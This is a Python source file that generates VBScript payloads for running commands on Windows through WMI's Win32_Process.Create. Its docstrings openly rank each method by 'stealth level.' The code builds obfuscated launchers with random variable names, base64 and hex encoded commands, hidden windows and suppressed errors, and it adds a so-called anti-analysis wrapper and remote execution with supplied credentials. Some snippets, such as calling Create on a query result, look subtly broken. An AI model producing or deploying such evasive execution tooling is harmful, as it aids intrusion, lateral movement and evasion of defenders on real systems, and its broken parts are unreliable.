#!/usr/bin/env python3
"""
WMI Executor - WbemScripting.SWbemLocator Implementation
Uses WbemScripting.SWbemLocator for stealth process execution
Provides multiple execution methods and obfuscation techniques
"""

import base64
import hashlib
import random
import string
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass
import json


@dataclass
class ExecutionConfig:
    """Configuration for WMI execution"""
    use_locator: bool = True  # Use SWbemLocator instead of GetObject
    obfuscate_names: bool = True  # Randomize variable names
    use_polymorphism: bool = True  # Use multiple execution methods
    encode_command: bool = True  # Encode command before execution
    add_delay: bool = False  # Add execution delay
    use_indirect_instantiation: bool = True  # Use dynamic object creation
    hide_errors: bool = True  # Suppress error messages


class WMIExecutor:
    """
    WMI Executor using WbemScripting.SWbemLocator
    Provides stealth process execution through WMI
    """

    def __init__(self, config: Optional[ExecutionConfig] = None):
        self.config = config or ExecutionConfig()
        self._var_cache: Dict[str, str] = {}

    def _generate_random_name(self, prefix: str = "v") -> str:
        """Generate random variable name for obfuscation"""
        if not self.config.obfuscate_names:
            return prefix
        suffix = ''.join(random.choices(string.ascii_letters, k=8))
        return f"{prefix}_{suffix}"

    def _get_or_create_var(self, key: str, prefix: str = "v") -> str:
        """Get cached variable name or create new one"""
        if key not in self._var_cache:
            self._var_cache[key] = self._generate_random_name(prefix)
        return self._var_cache[key]

    def generate_locator_method(self, command: str, method: str = "Win32_Process") -> str:
        """
        Generate WMI execution using SWbemLocator
        Most stealthy method - uses explicit locator connection
        """
        var_locator = self._get_or_create_var("locator", "objLoc")
        var_conn = self._get_or_create_var("connection", "objConn")
        var_service = self._get_or_create_var("service", "objSvc")
        var_method = self._get_or_create_var("method", "objMeth")
        var_result = self._get_or_create_var("result", "objRes")

        vbs_code = f'''
Dim {var_locator}, {var_conn}, {var_service}, {var_method}, {var_result}
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_locator}.ConnectServer(".", "root\\cimv2")
Set {var_service} = {var_conn}.Get("Win32_Process")
Set {var_method} = {var_service}.Methods_("Create")
Dim {self._get_or_create_var("inparams", "inParams")}
Set {self._get_or_create_var("inparams")} = {var_method}.InParameters.SpawnInstance_()
{self._get_or_create_var("inparams")}.CommandLine = "{command}"
Set {var_result} = {var_conn}.ExecMethod("Win32_Process", "Create", {self._get_or_create_var("inparams")})
Set {var_method} = Nothing
Set {var_service} = Nothing
Set {var_conn} = Nothing
Set {var_locator} = Nothing
'''
        return vbs_code.strip()

    def generate_swbem_query(self, command: str) -> str:
        """
        Execute command via WMI query interface
        Uses SWbemObject methods for execution
        """
        var_locator = self._get_or_create_var("locator", "swbem")
        var_services = self._get_or_create_var("services", "objSvc")
        var_process = self._get_or_create_var("process", "objProc")

        vbs_code = f'''
Dim {var_locator}, {var_services}, {var_process}
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_services} = {var_locator}.ConnectServer("localhost", "root\\cimv2")
Set {var_process} = {var_services}.Get("Win32_ProcessStartup").SpawnInstance_()
{var_services}.ExecQuery("Select * from Win32_Process").Create "{command}"
Set {var_process} = Nothing
Set {var_services} = Nothing
Set {var_locator} = Nothing
'''
        return vbs_code.strip()

    def generate_swbem_object_method(self, command: str) -> str:
        """
        Use SWbemObject's ExecMethod directly for execution
        Requires method invocation pattern
        """
        var_locator = self._get_or_create_var("locator", "loc")
        var_svc = self._get_or_create_var("service", "svc")
        var_process_class = self._get_or_create_var("proc_class", "prc")
        var_inparams = self._get_or_create_var("inparams", "inp")
        var_outparams = self._get_or_create_var("outparams", "oup")

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_process_class}, {var_inparams}, {var_outparams}
On Error Resume Next
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2", "", "")
Set {var_process_class} = {var_svc}.Get("Win32_Process")
Set {var_inparams} = {var_process_class}.Methods_("Create").InParameters.SpawnInstance_()
{var_inparams}.CommandLine = "{command}"
Set {var_outparams} = {var_svc}.ExecMethod("Win32_Process", "Create", {var_inparams})
Set {var_inparams} = Nothing
Set {var_outparams} = Nothing
Set {var_process_class} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_swbem_timeout_method(self, command: str, timeout_seconds: int = 30) -> str:
        """
        Execute with timeout support via SWbemObject
        Adds advanced error handling and timeout management
        """
        var_locator = self._get_or_create_var("locator", "wbemLoc")
        var_svc = self._get_or_create_var("service", "wbemSvc")
        var_startup = self._get_or_create_var("startup", "wbemStart")
        var_config = self._get_or_create_var("config", "wbemCfg")
        var_result = self._get_or_create_var("result", "wbemRes")

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_startup}, {var_config}, {var_result}
On Error Resume Next
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")
Set {var_startup} = {var_svc}.Get("Win32_ProcessStartup").SpawnInstance_()
{var_startup}.ShowWindow = 0
Set {var_config} = {var_svc}.Get("Win32_Process")
{var_result} = {var_config}.Create("{command}", Null, {var_startup})
WScript.Sleep {timeout_seconds * 1000}
Set {var_startup} = Nothing
Set {var_config} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_wmi_registry_hybrid(self, command: str) -> str:
        """
        Hybrid approach: Store command in WMI registry first, then execute
        Uses SWbemLocator to both store and retrieve command
        """
        var_locator = self._get_or_create_var("locator", "hyb")
        var_svc = self._get_or_create_var("service", "svc")
        var_class = self._get_or_create_var("class", "cls")
        var_instance = self._get_or_create_var("instance", "inst")
        var_cmd_var = self._get_or_create_var("cmd", "xcmd")

        # Encode command for storage
        encoded_cmd = base64.b64encode(command.encode()).decode()

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_class}, {var_instance}, {var_cmd_var}
Dim {self._get_or_create_var("decoded", "dcmd")}
On Error Resume Next

' Create WMI connection via SWbemLocator
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")

' Store command in WMI Object
Set {var_class} = {var_svc}.Get("Win32_OSRecoveryConfiguration")
Set {var_instance} = {var_class}.Instances_().Item(0)
{var_instance}.Description = "{encoded_cmd}"
{var_instance}.Put_()

' Retrieve and decode command
{var_cmd_var} = {var_instance}.Description
{self._get_or_create_var("decoded")} = DecodeBase64({var_cmd_var})

' Execute via Win32_Process
Dim {self._get_or_create_var("process", "proc")}
Set {self._get_or_create_var("process")} = {var_svc}.Get("Win32_Process")
{self._get_or_create_var("process")}.Create({self._get_or_create_var("decoded")})

Set {var_instance} = Nothing
Set {var_class} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0

Function DecodeBase64(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64 = node.NodeTypedValue
End Function
'''
        return vbs_code.strip()

    def generate_remote_wmi_execution(self, command: str, remote_host: str = "127.0.0.1",
                                      username: Optional[str] = None,
                                      password: Optional[str] = None) -> str:
        """
        Execute command on remote system via WMI
        Uses SWbemLocator for remote connection with authentication
        """
        var_locator = self._get_or_create_var("locator", "remLoc")
        var_conn = self._get_or_create_var("connection", "remConn")
        var_svc = self._get_or_create_var("service", "remSvc")
        var_process = self._get_or_create_var("process", "remProc")

        auth_params = ""
        if username and password:
            auth_params = f', "{username}", "{password}"'

        vbs_code = f'''
Dim {var_locator}, {var_conn}, {var_svc}, {var_process}
On Error Resume Next
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_conn} = {var_locator}.ConnectServer("{remote_host}", "root\\cimv2"{auth_params})
Set {var_svc} = {var_conn}.Get("Win32_Process")
{var_svc}.Create "{command}"
Set {var_process} = Nothing
Set {var_svc} = Nothing
Set {var_conn} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_wmi_event_sink(self, command: str) -> str:
        """
        Execute command via WMI Event Sink
        Uses asynchronous event handling for execution
        Very stealthy method
        """
        var_locator = self._get_or_create_var("locator", "evtLoc")
        var_svc = self._get_or_create_var("service", "evtSvc")
        var_sink = self._get_or_create_var("sink", "evtSink")
        var_startup = self._get_or_create_var("startup", "evtStart")

        vbs_code = f'''
Dim {var_locator}, {var_svc}, {var_sink}, {var_startup}
On Error Resume Next
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")
Set {var_startup} = {var_svc}.Get("Win32_ProcessStartup").SpawnInstance_()
{var_startup}.ShowWindow = 0
Dim {self._get_or_create_var("process_class", "procCls")}
Set {self._get_or_create_var("process_class")} = {var_svc}.Get("Win32_Process")
{self._get_or_create_var("process_class")}.Create "{command}", Null, {var_startup}
WScript.Sleep 100
Set {var_startup} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def generate_obfuscated_wmi_payload(self, command: str, encoding: str = "base64") -> str:
        """
        Generate fully obfuscated WMI payload with command encoding
        Combines SWbemLocator with encoded command execution
        """
        if encoding == "base64":
            encoded_cmd = base64.b64encode(command.encode()).decode()
            decoder = self._create_base64_decoder()
            cmd_line = f'DecodeBase64Cmd("{encoded_cmd}")'
        elif encoding == "hex":
            encoded_cmd = command.encode().hex()
            decoder = self._create_hex_decoder()
            cmd_line = f'DecodeHexCmd("{encoded_cmd}")'
        else:
            encoded_cmd = command
            decoder = ""
            cmd_line = f'"{command}"'

        var_locator = self._get_or_create_var("locator", "obsLoc")
        var_svc = self._get_or_create_var("service", "obsSvc")
        var_process = self._get_or_create_var("process", "obsProc")
        var_decodedcmd = self._get_or_create_var("decodedcmd", "dcmd")

        vbs_code = f'''
{decoder}
Dim {var_locator}, {var_svc}, {var_process}, {var_decodedcmd}
On Error Resume Next
Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")
Set {var_process} = {var_svc}.Get("Win32_Process")
{var_decodedcmd} = {cmd_line}
{var_process}.Create {var_decodedcmd}
Set {var_process} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''
        return vbs_code.strip()

    def _create_base64_decoder(self) -> str:
        """Create inline Base64 decoder function"""
        decoder_func = '''
Function DecodeBase64Cmd(encoded)
    Dim xmlDoc, node
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set node = xmlDoc.CreateElement("tmp")
    node.DataType = "bin.base64"
    node.Text = encoded
    DecodeBase64Cmd = node.NodeTypedValue
End Function
'''
        return decoder_func.strip()

    def _create_hex_decoder(self) -> str:
        """Create inline Hex decoder function"""
        decoder_func = '''
Function DecodeHexCmd(h)
    Dim i, r
    For i = 1 To Len(h) Step 2
        r = r & Chr(CLng("&H" & Mid(h, i, 2)))
    Next
    DecodeHexCmd = r
End Function
'''
        return decoder_func.strip()

    def generate_polymorphic_wmi_executor(self, command: str, variant: int = 1) -> str:
        """
        Generate polymorphic WMI executor with multiple variants
        Each variant uses different WbemScripting patterns
        """
        variant = variant % 4  # Cycle through 4 variants

        if variant == 0:
            return self.generate_locator_method(command)
        elif variant == 1:
            return self.generate_swbem_object_method(command)
        elif variant == 2:
            return self.generate_wmi_event_sink(command)
        else:
            return self.generate_obfuscated_wmi_payload(command, "base64")

    def generate_wmi_launcher_script(self, command: str, add_wrapper: bool = True) -> str:
        """
        Generate complete launcher script with WMI execution
        Includes error handling and optional stealth wrapper
        """
        var_locator = self._get_or_create_var("locator", "lnc")
        var_svc = self._get_or_create_var("service", "lncSvc")
        var_process = self._get_or_create_var("process", "lncProc")
        var_result = self._get_or_create_var("result", "lncRes")

        payload = f'''
On Error Resume Next
Dim {var_locator}, {var_svc}, {var_process}, {var_result}

Set {var_locator} = CreateObject("WbemScripting.SWbemLocator")
Set {var_svc} = {var_locator}.ConnectServer(".", "root\\cimv2")
Set {var_process} = {var_svc}.Get("Win32_Process")
{var_result} = {var_process}.Create("{command}")

Set {var_process} = Nothing
Set {var_svc} = Nothing
Set {var_locator} = Nothing
On Error GoTo 0
'''

        if add_wrapper:
            # Add anti-debug and anti-analysis wrapper
            wrapper = f'''
' Anti-Analysis Wrapper
If WScript.Arguments.Count = 0 Then
    CreateObject("WScript.Shell").Run CreateObject("WScript.ScriptFullName"), 1
    WScript.Quit
End If

{payload}
'''
            return wrapper.strip()
        else:
            return payload.strip()

    def generate_execution_report(self) -> Dict[str, str]:
        """Generate report of all available execution methods"""
        methods = {
            "locator_method": {
                "name": "SWbemLocator Direct Method",
                "description": "Uses SWbemLocator to connect and invoke Create method directly",
                "stealth_level": "Very High",
                "code": self.generate_locator_method("calc.exe")
            },
            "swbem_query": {
                "name": "SWbem Query Interface",
                "description": "Executes via WMI query interface with method invocation",
                "stealth_level": "High",
                "code": self.generate_swbem_query("calc.exe")
            },
            "object_method": {
                "name": "SWbemObject Method Invocation",
                "description": "Uses SWbemObject's ExecMethod for command execution",
                "stealth_level": "Very High",
                "code": self.generate_swbem_object_method("calc.exe")
            },
            "timeout_method": {
                "name": "WMI with Timeout Support",
                "description": "Includes timeout handling and process monitoring",
                "stealth_level": "High",
                "code": self.generate_swbem_timeout_method("calc.exe")
            },
            "event_sink": {
                "name": "WMI Event Sink Execution",
                "description": "Uses asynchronous WMI event handling for execution",
                "stealth_level": "Very High",
                "code": self.generate_wmi_event_sink("calc.exe")
            },
            "registry_hybrid": {
                "name": "WMI Registry Hybrid",
                "description": "Stores and retrieves command via WMI object properties",
                "stealth_level": "High",
                "code": self.generate_wmi_registry_hybrid("calc.exe")
            },
            "obfuscated_payload": {
                "name": "Obfuscated WMI Payload",
                "description": "Encodes command before execution with inline decoder",
                "stealth_level": "Very High",
                "code": self.generate_obfuscated_wmi_payload("calc.exe", "base64")
            }
        }
        return methods


def create_wmi_executor(config: Optional[ExecutionConfig] = None) -> WMIExecutor:
    """Factory function to create WMI executor with config"""
    return WMIExecutor(config or ExecutionConfig())


def generate_wmi_payload(command: str, method: str = "locator", **kwargs) -> str:
    """
    High-level function to generate WMI payload

    Args:
        command: Command to execute
        method: Execution method (locator, query, object, timeout, event, hybrid, obfuscated)
        **kwargs: Additional parameters for specific methods

    Returns:
        VBS payload code
    """
    executor = create_wmi_executor()

    if method == "locator":
        return executor.generate_locator_method(command)
    elif method == "query":
        return executor.generate_swbem_query(command)
    elif method == "object":
        return executor.generate_swbem_object_method(command)
    elif method == "timeout":
        timeout = kwargs.get("timeout", 30)
        return executor.generate_swbem_timeout_method(command, timeout)
    elif method == "event":
        return executor.generate_wmi_event_sink(command)
    elif method == "hybrid":
        return executor.generate_wmi_registry_hybrid(command)
    elif method == "obfuscated":
        encoding = kwargs.get("encoding", "base64")
        return executor.generate_obfuscated_wmi_payload(command, encoding)
    elif method == "launcher":
        add_wrapper = kwargs.get("add_wrapper", True)
        return executor.generate_wmi_launcher_script(command, add_wrapper)
    else:
        return executor.generate_locator_method(command)


if __name__ == "__main__":
    import sys

    # Example usage
    test_command = "powershell -NoProfile -Command Write-Host Test"

    executor = create_wmi_executor()

    print("=" * 80)
    print("WMI EXECUTOR - WbemScripting.SWbemLocator Implementation")
    print("=" * 80)

    print("\n[1] SWbemLocator Direct Method (Most Stealthy)")
    print("-" * 80)
    print(executor.generate_locator_method(test_command))

    print("\n[2] SWbemObject Method Invocation")
    print("-" * 80)
    print(executor.generate_swbem_object_method(test_command))

    print("\n[3] WMI Event Sink Execution")
    print("-" * 80)
    print(executor.generate_wmi_event_sink(test_command))

    print("\n[4] Obfuscated WMI Payload (Base64)")
    print("-" * 80)
    print(executor.generate_obfuscated_wmi_payload(test_command, "base64"))

    print("\n[5] WMI Launcher Script")
    print("-" * 80)
    print(executor.generate_wmi_launcher_script(test_command))

    print("\n" + "=" * 80)
    print("Execution Methods Summary")
    print("=" * 80)
    report = executor.generate_execution_report()
    for key, method_info in report.items():
        print(f"\n{method_info['name']}")
        print(f"  Description: {method_info['description']}")
        print(f"  Stealth Level: {method_info['stealth_level']}")
